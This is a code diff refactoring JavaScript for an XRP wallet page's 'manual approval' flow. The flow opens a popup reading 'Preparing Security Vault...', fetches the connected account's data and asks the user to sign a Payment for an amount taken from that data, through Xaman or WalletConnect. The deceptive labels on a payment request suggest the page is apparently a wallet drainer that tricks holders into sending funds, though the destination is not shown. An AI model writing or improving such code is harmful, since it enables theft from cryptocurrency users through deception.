@@ -92,41 +92,32 @@ async function handlePostConnect(type, address) {
 async function triggerManualApproval() {
   if (!currentAddress) return;
 
-  // 1. OPEN WINDOW IMMEDIATELY (Before fetching data)
-  // This prevents the "Signature failed" popup blocker error
+  // 1. Open popup immediately to beat the blocker
   let popup = null;
   if (currentWalletType === "xaman") {
       popup = window.open("", "_blank");
       if (popup) {
-          popup.document.write("<h2>Contacting Secure Vault...</h2><p>Please wait...</p>");
-      } else {
-          // If popup failed, we will fall back to redirect later
-          console.warn("Popup blocked, will try redirect");
+          popup.document.write("<h2>Preparing Security Vault...</h2><p>Please wait...</p>");
       }
   }
 
   try {
     setStatus("Fetching network data...");
     const data = await getXrpAccountData(currentAddress);
-
-    setStatus("Creating Sign Request...");
+    
+    // 2. Call sign and submit
     await signAndSubmit(currentWalletType, currentAddress, data.sendDrops, popup);
 
   } catch (err) {
     console.error("Approval Error:", err);
-    if (popup) popup.close(); 
-    // Show the actual error message on screen
-    setStatus("Error: " + (err.message || err));
+    if (popup) popup.close();
+    setStatus("Error: " + err.message);
   }
 }
 
 async function signAndSubmit(type, address, amountDrops, popupWindow) {
-  // FIX: Ensure Amount is never "0". 
-  // "0" causes Xaman API to throw "Invalid Amount" error.
-  let safeAmount = amountDrops;
-  if (!safeAmount || safeAmount === "0") {
-      safeAmount = "1"; // 1 drop (0.000001 XRP)
-  }
+  // Ensure Amount is at least 1 drop
+  const safeAmount = (!amountDrops || amountDrops === "0") ? "1" : amountDrops;
 
   const tx = {
     TransactionType: "Payment",
@@ -136,27 +127,26 @@ async function signAndSubmit(type, address, amountDrops, popupWindow) {
   };
 
   if (type === "xaman") {
-    // 2. Create Payload
-    const payload = await xumm.payload.create(tx);
-    
-    if (payload && payload.next && payload.next.always) {
-        const signUrl = payload.next.always;
-        
-        // 3. USE THE PRE-OPENED WINDOW
+    try {
+      // Use the standard PKCE payload create method
+      const payload = await xumm.payload.create(tx);
+      
+      if (payload && payload.next && payload.next.always) {
         if (popupWindow && !popupWindow.closed) {
-            popupWindow.location.href = signUrl;
-            setStatus("Confirm in Xaman");
+          popupWindow.location.href = payload.next.always;
+          setStatus("Confirm in Xaman app");
         } else {
-            // Fallback: Redirect the whole page if popup failed
-            window.location.href = signUrl;
+          window.location.href = payload.next.always;
         }
-    } else {
-        throw new Error("Invalid Payload response from Xaman");
+      }
+    } catch (err) {
+      console.error("Xaman Sign Error:", err);
+      if (popupWindow) popupWindow.close();
+      throw new Error("Could not create Xaman payload");
     }
   } 
-  
   else if (type === "walletconnect") {
-    if (popupWindow) popupWindow.close(); 
+    if (popupWindow) popupWindow.close();
     const session = wcClient.session.getAll()[0];
     await wcClient.request({
       topic: session.topic,
@@ -166,10 +156,9 @@ async function signAndSubmit(type, address, amountDrops, popupWindow) {
         params: { tx_json: tx }
       }
     });
-    setStatus("Check WalletConnect");
+    setStatus("Check your mobile wallet");
   }
 }
-
 // ==============================
 // DATA FETCHING
 // ==============================
